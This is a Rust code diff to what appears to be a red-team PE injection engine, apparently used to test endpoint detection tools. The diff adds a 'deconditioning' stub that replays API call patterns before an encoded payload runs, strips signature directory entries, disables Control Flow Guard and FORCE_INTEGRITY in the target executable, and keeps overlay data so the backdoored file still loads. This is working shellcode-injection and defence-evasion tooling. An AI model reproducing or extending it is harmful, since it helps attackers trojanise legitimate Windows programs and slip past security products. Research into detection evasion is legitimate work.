@@ -26,6 +26,7 @@
 //! - No IAT reuse (stub is self-contained PIC, unlike SuperMega's Cordyceps)
 //! - Target PE must have room for one more section header
 
+pub mod decon;
 pub mod stubs;
 
 use std::path::{Path, PathBuf};
@@ -119,8 +120,11 @@ pub struct PeInjectInput {
     /// When enabled, a VEH handler stub is prepended to catch breakpoints and
     /// report progress via `\\.\pipe\rededr_checkpoints`.
     pub sc_checkpoint_count: Option<u32>,
-    /// Path to xwin SDK sysroot (required when sc_checkpoint_count > 0).
+    /// Path to xwin SDK sysroot (required when sc_checkpoint_count > 0 OR decon_spec is set).
     pub xwin_dir: Option<PathBuf>,
+    /// Optional deconditioning specification. When set, a PIC bytecode interpreter
+    /// is prepended that replays API call patterns N rounds before payload execution.
+    pub decon_spec: Option<decon::DeconSpec>,
 }
 
 /// Metadata about a successfully injected artifact.
@@ -148,6 +152,8 @@ pub struct InjectedArtifact {
     pub target_pe_name: String,
     /// Number of shellcode checkpoints inserted (0 if disabled).
     pub checkpoint_count: u32,
+    /// Number of deconditioning rounds (0 if disabled).
+    pub decon_rounds: u16,
 }
 
 /// PE injection engine.
@@ -326,6 +332,12 @@ impl PeInjector {
         // If return_to_oep is true, OEP_DELTA is patched after we know the section RVA
 
         // 6. Assemble section data
+        //
+        // Track carrier_stub_offset: the offset of the carrier stub within the
+        // final section data. Needed for correct OEP patching when VEH or decon
+        // stubs are prepended before the carrier.
+        let mut carrier_stub_offset: usize = 0;
+
         let section_data = if !checkpoint_table.is_empty() {
             // Instrumented path: [veh_stub | checkpoint_data | decode_stub | key | payload]
             let xwin_dir = input.xwin_dir.as_ref().ok_or_else(|| {
@@ -348,21 +360,79 @@ impl PeInjector {
                 veh_layout.decode_jmp_disp_offset,
             );
 
-            stubs::assemble_instrumented_section(
+            let instrumented = stubs::assemble_instrumented_section(
                 &veh_code,
                 &veh_layout,
                 &checkpoint_table,
                 &stub,
                 &key_bytes,
                 encoded_data,
-            )
+            );
+            // Carrier stub starts after VEH code + data trailer
+            carrier_stub_offset =
+                instrumented.len() - stub.len() - key_bytes.len() - encoded_data.len();
+            debug!(
+                "Carrier stub offset in instrumented section: {:#x}",
+                carrier_stub_offset
+            );
+            instrumented
         } else {
             // Standard path: [stub | key | encoded_payload]
+            // carrier_stub_offset stays 0
             let mut data = Vec::with_capacity(stub.len() + key_bytes.len() + encoded_data.len());
             data.extend_from_slice(&stub);
             data.extend_from_slice(&key_bytes);
             data.extend_from_slice(encoded_data);
             data
+        };
+
+        // 6b. Prepend decon stub if decon_spec is set
+        //
+        // Layout: [decon_stub | sequence_table | section_data...]
+        // The decon stub runs first, then JMPs to section_data (carrier/VEH).
+        let decon_rounds = input
+            .decon_spec
+            .as_ref()
+            .map(|s| s.round_count)
+            .unwrap_or(0);
+        let section_data = if let Some(ref decon_spec) = input.decon_spec {
+            let xwin_dir = input
+                .xwin_dir
+                .as_ref()
+                .ok_or_else(|| anyhow::anyhow!("xwin_dir is required when decon_spec is set"))?;
+            let decon_source = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
+                .join("src")
+                .join("pe_inject")
+                .join("stub")
+                .join("decon_stub.c");
+            let cache_dir = self.config.output_dir.join(".decon_cache");
+
+            let (decon_code, decon_layout) =
+                decon::compile_decon_stub(xwin_dir, &decon_source, &cache_dir)
+                    .context("Failed to compile decon stub")?;
+
+            let seq_table = decon_spec.serialize();
+            debug!(
+                "Decon: {} rounds, {} steps, stub {} bytes, table {} bytes",
+                decon_spec.round_count,
+                decon_spec.steps.len(),
+                decon_code.len(),
+                seq_table.len(),
+            );
+
+            let (mut decon_section, _next_stage_offset) =
+                decon::assemble_decon_section(&decon_code, &decon_layout, &seq_table);
+            // Shift carrier_stub_offset by the decon prefix size
+            let decon_prefix_size = decon_section.len();
+            carrier_stub_offset += decon_prefix_size;
+            debug!(
+                "Decon prefix: {} bytes, carrier stub now at offset {:#x} in section",
+                decon_prefix_size, carrier_stub_offset
+            );
+            decon_section.extend_from_slice(&section_data);
+            decon_section
+        } else {
+            section_data
         };
 
         // 7. Place section data in PE (mode-dependent)
@@ -428,18 +498,27 @@ impl PeInjector {
         );
 
         // 8. Patch OEP return delta (now that we know section_rva)
+        //
+        // The carrier stub's OEP LEA is at carrier_stub_offset + oep_patch within
+        // the section. When decon or VEH stubs are prepended, carrier_stub_offset > 0.
         if input.return_to_oep {
             if let Some(oep_patch) = layout.oep_patch {
-                // The lea rax instruction is at section_rva + oep_lea_offset
-                // RIP after lea = section_rva + oep_patch + 4 (lea is 7 bytes: 3 opcode + 4 imm32)
-                let rip_after_lea = section_rva + oep_patch as u32 + 4;
+                // Absolute offset of the OEP disp32 within the section
+                let oep_abs_offset = carrier_stub_offset + oep_patch;
+
+                // RIP after lea = section_rva + oep_abs_offset + 4
+                let rip_after_lea = section_rva + oep_abs_offset as u32 + 4;
                 let oep_delta = original_ep as i32 - rip_after_lea as i32;
 
                 // Write delta into the section data in the PE
                 let section_file_offset = rva_to_offset(&pe_bytes, section_rva)
                     .context("Failed to find section file offset for OEP patching")?;
-                let patch_file_offset = section_file_offset + oep_patch;
+                let patch_file_offset = section_file_offset + oep_abs_offset;
                 write_u32_at(&mut pe_bytes, patch_file_offset, oep_delta as u32);
+                debug!(
+                    "OEP return patched: carrier_stub@{:#x} + oep_patch@{:#x} = section+{:#x}, delta={:#x}",
+                    carrier_stub_offset, oep_patch, oep_abs_offset, oep_delta as u32
+                );
             }
             if input.redirect_mode == RedirectMode::EpHijack {
                 warn!(
@@ -493,15 +572,168 @@ impl PeInjector {
             }
         }
 
-        // 10. Recompute PE checksum
+        // 10. Clear Security Directory (index 4) — injection invalidates any signature,
+        // and goblin will fail parsing if a stale certificate table entry points into
+        // injected data. This matches standard PE injection behavior.
+        {
+            let security_dir_offset = opt_header_off + 0x70 + 4 * 8; // DataDirectory[4]
+            if security_dir_offset + 8 <= pe_bytes.len() {
+                write_u32_at(&mut pe_bytes, security_dir_offset, 0); // VirtualAddress = 0
+                write_u32_at(&mut pe_bytes, security_dir_offset + 4, 0); // Size = 0
+            }
+        }
+
+        // 10b. Neutralize Control Flow Guard (CFG).
+        //
+        // When the target PE has IMAGE_DLLCHARACTERISTICS_GUARD_CF (0x4000),
+        // Windows validates indirect call targets through a CFG bitmap.
+        // Our injected entry point isn't in the bitmap, so BaseThreadInitThunk
+        // would terminate the process before our code runs.
+        //
+        // Fix: clear the GUARD_CF bit from DllCharacteristics and zero the
+        // Load Config directory's CFG function table pointer + count so the
+        // loader doesn't set up CFG enforcement.
+        {
+            let dll_chars_off = opt_header_off + 0x46;
+            if dll_chars_off + 2 <= pe_bytes.len() {
+                let dll_chars = read_u16(&pe_bytes, dll_chars_off);
+                if dll_chars & 0x4000 != 0 {
+                    let new_chars = dll_chars & !0x4000;
+                    write_u16_at(&mut pe_bytes, dll_chars_off, new_chars);
+                    debug!(
+                        "Cleared GUARD_CF from DllCharacteristics: {:#06x} → {:#06x}",
+                        dll_chars, new_chars
+                    );
+
+                    // Also neuter CFG fields in the Load Configuration Directory
+                    // (DataDirectory index 10) so stale CFG tables are ignored.
+                    let load_config_dir_off = opt_header_off + 0x70 + 10 * 8;
+                    if load_config_dir_off + 8 <= pe_bytes.len() {
+                        let lc_rva = read_u32(&pe_bytes, load_config_dir_off);
+                        let lc_size = read_u32(&pe_bytes, load_config_dir_off + 4);
+                        if lc_rva != 0
+                            && lc_size != 0
+                            && let Some(lc_off) = rva_to_offset(&pe_bytes, lc_rva)
+                        {
+                            // PE32+ IMAGE_LOAD_CONFIG_DIRECTORY64 offsets:
+                            //   0x58: SecurityCookie (u64)       — DO NOT TOUCH
+                            //   0x60: SEHandlerTable (u64)       — DO NOT TOUCH
+                            //   0x68: SEHandlerCount (u64)       — DO NOT TOUCH
+                            //   0x70: GuardCFCheckFunctionPointer (u64)
+                            //   0x78: GuardCFDispatchFunctionPointer (u64)
+                            //   0x80: GuardCFFunctionTable (u64)
+                            //   0x88: GuardCFFunctionCount (u64)
+                            //   0x90: GuardFlags (u32)
+                            // Only zero CFG fields if the Load Config is large enough.
+                            let cfg_fields_end: u32 = 0x94; // GuardFlags(4) ends at 0x94
+                            if lc_size >= cfg_fields_end {
+                                // Zero GuardCFCheckFunctionPointer (u64 at 0x70)
+                                write_u32_at(&mut pe_bytes, lc_off + 0x70, 0);
+                                write_u32_at(&mut pe_bytes, lc_off + 0x74, 0);
+                                // Zero GuardCFDispatchFunctionPointer (u64 at 0x78)
+                                write_u32_at(&mut pe_bytes, lc_off + 0x78, 0);
+                                write_u32_at(&mut pe_bytes, lc_off + 0x7C, 0);
+                                // Zero GuardCFFunctionTable (u64 at 0x80)
+                                write_u32_at(&mut pe_bytes, lc_off + 0x80, 0);
+                                write_u32_at(&mut pe_bytes, lc_off + 0x84, 0);
+                                // Zero GuardCFFunctionCount (u64 at 0x88)
+                                write_u32_at(&mut pe_bytes, lc_off + 0x88, 0);
+                                write_u32_at(&mut pe_bytes, lc_off + 0x8C, 0);
+                                // Zero GuardFlags (u32 at 0x90)
+                                write_u32_at(&mut pe_bytes, lc_off + 0x90, 0);
+                                debug!(
+                                    "Zeroed CFG fields in Load Config at RVA {:#x} (file offset {:#x})",
+                                    lc_rva, lc_off
+                                );
+                            }
+                        }
+                    }
+                }
+            }
+        }
+
+        // 10c. Clear FORCE_INTEGRITY if set — we invalidated the signature in step 10.
+        {
+            let dll_chars_off = opt_header_off + 0x46;
+            if dll_chars_off + 2 <= pe_bytes.len() {
+                let dll_chars = read_u16(&pe_bytes, dll_chars_off);
+                if dll_chars & 0x0080 != 0 {
+                    let new_chars = dll_chars & !0x0080;
+                    write_u16_at(&mut pe_bytes, dll_chars_off, new_chars);
+                    debug!(
+                        "Cleared FORCE_INTEGRITY from DllCharacteristics: {:#06x} → {:#06x}",
+                        dll_chars, new_chars
+                    );
+                }
+            }
+        }
+
+        // 11. Recompute PE checksum
         compute_pe_checksum(&mut pe_bytes);
 
-        // 11. Validate with goblin
+        // 12. Validate with goblin
         goblin::pe::PE::parse(&pe_bytes)
             .map_err(|e| anyhow::anyhow!("Injection produced invalid PE: {}", e))?;
         info!("PE validation passed after injection");
 
-        // 12. Optional binary mutations
+        // 12b. Diagnostic: verify the injected section in the output PE
+        {
+            let section_file_off = rva_to_offset(&pe_bytes, section_rva).unwrap_or(0);
+            let (sec_table_off, num_sec) = section_table_info(&pe_bytes);
+            // Find our section by RVA
+            for i in 0..num_sec {
+                let so = sec_table_off + i * SECTION_HEADER_SIZE;
+                let va = read_u32(&pe_bytes, so + 12);
+                if va == section_rva {
+                    let chars = read_u32(&pe_bytes, so + 36);
+                    let vsize = read_u32(&pe_bytes, so + 8);
+                    let raw_size = read_u32(&pe_bytes, so + 16);
+                    let raw_ptr = read_u32(&pe_bytes, so + 20);
+                    let name_bytes = &pe_bytes[so..so + 8];
+                    let sec_name = String::from_utf8_lossy(name_bytes);
+                    debug!(
+                        "Section '{}' @ RVA {:#x}: VSize={:#x} RawSize={:#x} RawPtr={:#x} Chars={:#010x}",
+                        sec_name.trim_end_matches('\0'),
+                        va,
+                        vsize,
+                        raw_size,
+                        raw_ptr,
+                        chars
+                    );
+                    debug!(
+                        "  RWX check: R={} W={} X={}",
+                        (chars & 0x4000_0000) != 0,
+                        (chars & 0x8000_0000) != 0,
+                        (chars & 0x2000_0000) != 0,
+                    );
+                    debug!(
+                        "  Section layout: carrier_stub@+{:#x}, total section data={} bytes",
+                        carrier_stub_offset,
+                        section_data.len()
+                    );
+                    // Verify first bytes match expected stub
+                    if section_file_off > 0 && section_file_off + 4 <= pe_bytes.len() {
+                        let first4 = &pe_bytes[section_file_off..section_file_off + 4];
+                        debug!(
+                            "  First 4 bytes at file offset {:#x}: {:02x} {:02x} {:02x} {:02x}",
+                            section_file_off, first4[0], first4[1], first4[2], first4[3]
+                        );
+                    }
+                    // Show carrier stub first bytes
+                    let carrier_file_off = section_file_off + carrier_stub_offset;
+                    if carrier_file_off + 4 <= pe_bytes.len() {
+                        let c4 = &pe_bytes[carrier_file_off..carrier_file_off + 4];
+                        debug!(
+                            "  Carrier stub bytes at file offset {:#x}: {:02x} {:02x} {:02x} {:02x} (expect 56=push rsi)",
+                            carrier_file_off, c4[0], c4[1], c4[2], c4[3]
+                        );
+                    }
+                    break;
+                }
+            }
+        }
+
+        // 13. Optional binary mutations
         let mut mutations_applied = Vec::new();
         if !input.binary_mutations.is_empty() {
             let specs: Vec<&MutationSpec> = input.binary_mutations.iter().collect();
@@ -513,7 +745,7 @@ impl PeInjector {
             mutations_applied = applied;
         }
 
-        // 13. Write output file
+        // 14. Write output file
         let sha256 = {
             let mut hasher = Sha256::new();
             hasher.update(&pe_bytes);
@@ -541,6 +773,7 @@ impl PeInjector {
             cave_section,
             target_pe_name,
             checkpoint_count: checkpoint_table.len() as u32,
+            decon_rounds,
         })
     }
 }
@@ -666,14 +899,42 @@ fn add_section(
     let new_raw_ptr = align_up(last_raw_ptr + last_raw_size, file_align);
     let padded_size = align_up(data.len() as u32, file_align);
 
-    // Extend file
-    let required_size = new_raw_ptr as usize + padded_size as usize;
-    if pe_bytes.len() < required_size {
-        pe_bytes.resize(required_size, 0);
-    }
+    // Preserve overlay data: any bytes beyond the last section's raw data end.
+    // Real PEs (signed executables, packed binaries) often have overlay data
+    // that must be relocated after the new section.
+    let last_section_end = (last_raw_ptr + last_raw_size) as usize;
+    let overlay = if pe_bytes.len() > last_section_end {
+        let overlay_data = pe_bytes[last_section_end..].to_vec();
+        if !overlay_data.iter().all(|&b| b == 0) {
+            debug!(
+                "Preserving {} bytes of overlay data (at file offset {:#x})",
+                overlay_data.len(),
+                last_section_end
+            );
+        }
+        Some(overlay_data)
+    } else {
+        None
+    };
+
+    // Extend or resize file to fit new section + relocated overlay
+    let overlay_len = overlay.as_ref().map(|o| o.len()).unwrap_or(0);
+    let required_size = new_raw_ptr as usize + padded_size as usize + overlay_len;
+    pe_bytes.resize(required_size, 0);
 
     // Write section data
     pe_bytes[new_raw_ptr as usize..new_raw_ptr as usize + data.len()].copy_from_slice(data);
+    // Zero-fill padding between data end and padded boundary
+    let data_end = new_raw_ptr as usize + data.len();
+    let padded_end = new_raw_ptr as usize + padded_size as usize;
+    for b in &mut pe_bytes[data_end..padded_end] {
+        *b = 0;
+    }
+
+    // Relocate overlay after the new section
+    if let Some(ref overlay_data) = overlay {
+        pe_bytes[padded_end..padded_end + overlay_data.len()].copy_from_slice(overlay_data);
+    }
 
     // Write section header
     let hdr_off = sec_table_off + num_sec * SECTION_HEADER_SIZE;
@@ -1506,6 +1767,7 @@ mod tests {
             redirect_mode: RedirectMode::HeaderPatch,
             sc_checkpoint_count: None,
             xwin_dir: None,
+            decon_spec: None,
         };
 
         let artifact = injector.inject(&input).unwrap();
@@ -1551,6 +1813,7 @@ mod tests {
             redirect_mode: RedirectMode::HeaderPatch,
             sc_checkpoint_count: None,
             xwin_dir: None,
+            decon_spec: None,
         };
 
         let artifact = injector.inject(&input).unwrap();
@@ -1585,6 +1848,7 @@ mod tests {
             redirect_mode: RedirectMode::HeaderPatch,
             sc_checkpoint_count: None,
             xwin_dir: None,
+            decon_spec: None,
         };
 
         let artifact = injector.inject(&input).unwrap();
@@ -1617,6 +1881,7 @@ mod tests {
             redirect_mode: RedirectMode::HeaderPatch,
             sc_checkpoint_count: None,
             xwin_dir: None,
+            decon_spec: None,
         };
 
         assert!(injector.inject(&input).is_err());
@@ -1645,6 +1910,7 @@ mod tests {
             redirect_mode: RedirectMode::HeaderPatch,
             sc_checkpoint_count: None,
             xwin_dir: None,
+            decon_spec: None,
         };
 
         let artifact = injector.inject(&input).unwrap();
@@ -1680,6 +1946,7 @@ mod tests {
             redirect_mode: RedirectMode::HeaderPatch,
             sc_checkpoint_count: None,
             xwin_dir: None,
+            decon_spec: None,
         };
 
         let artifact = injector.inject(&input).unwrap();
@@ -1717,6 +1984,7 @@ mod tests {
             redirect_mode: RedirectMode::HeaderPatch,
             sc_checkpoint_count: None,
             xwin_dir: None,
+            decon_spec: None,
         };
 
         let artifact = injector.inject(&input).unwrap();
@@ -1795,6 +2063,7 @@ mod tests {
             redirect_mode: RedirectMode::HeaderPatch,
             sc_checkpoint_count: None,
             xwin_dir: None,
+            decon_spec: None,
         };
 
         let artifact = injector.inject(&input).unwrap();
@@ -1860,6 +2129,7 @@ mod tests {
             redirect_mode: RedirectMode::HeaderPatch,
             sc_checkpoint_count: None,
             xwin_dir: None,
+            decon_spec: None,
         };
 
         let artifact = injector.inject(&input).unwrap();
@@ -1924,6 +2194,7 @@ mod tests {
             redirect_mode: RedirectMode::HeaderPatch,
             sc_checkpoint_count: None,
             xwin_dir: None,
+            decon_spec: None,
         };
 
         let artifact = injector.inject(&input).unwrap();
@@ -1984,6 +2255,7 @@ mod tests {
             redirect_mode: RedirectMode::HeaderPatch,
             sc_checkpoint_count: None,
             xwin_dir: None,
+            decon_spec: None,
         };
 
         let artifact = injector.inject(&input).unwrap();
@@ -2023,6 +2295,7 @@ mod tests {
             redirect_mode: RedirectMode::HeaderPatch,
             sc_checkpoint_count: None,
             xwin_dir: None,
+            decon_spec: None,
         };
 
         let artifact = injector.inject(&input).unwrap();
@@ -2125,6 +2398,7 @@ mod tests {
             redirect_mode: RedirectMode::EpHijack,
             sc_checkpoint_count: None,
             xwin_dir: None,
+            decon_spec: None,
         };
 
         let artifact = injector.inject(&input).unwrap();
@@ -2322,6 +2596,7 @@ mod tests {
             redirect_mode: RedirectMode::HeaderPatch,
             sc_checkpoint_count: None,
             xwin_dir: None,
+            decon_spec: None,
         };
 
         let artifact = injector.inject(&input).unwrap();
